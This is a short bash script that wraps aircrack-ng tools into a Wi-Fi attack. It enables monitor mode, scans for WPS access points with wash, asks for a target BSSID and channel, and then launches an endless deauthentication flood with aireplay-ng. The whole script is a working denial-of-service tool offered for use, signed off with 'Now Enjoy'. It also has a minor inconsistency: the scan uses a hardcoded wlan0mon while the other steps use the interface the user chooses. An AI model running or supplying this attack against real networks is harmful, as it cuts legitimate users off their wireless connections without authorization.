echo "Press CTRL+C To Exit"
airmon-ng
echo "*** Hint: wlan0"
echo "Please Enter Interface Name Which You Want To Use"
read wlan
echo "You Have Selected $wlan"
airmon-ng start $wlan
echo "Monitor Mod Started"
echo "Press CTRL+C To Stop Scanning Network"
xterm -e wash -i wlan0mon -a -o w
cat w
echo "Enter The BSSID Of Your Target"
read bssid
echo "Enter The Channel Number"
read ch
echo "*** Now Enjoy ***(Press CTRL+C To Stop)"
echo "Press ANY Key To Start"
iwconfig $wlan"mon" channel $ch
read a

aireplay-ng -0 0 -a $bssid --ignore-negative-one $wlan"mon"
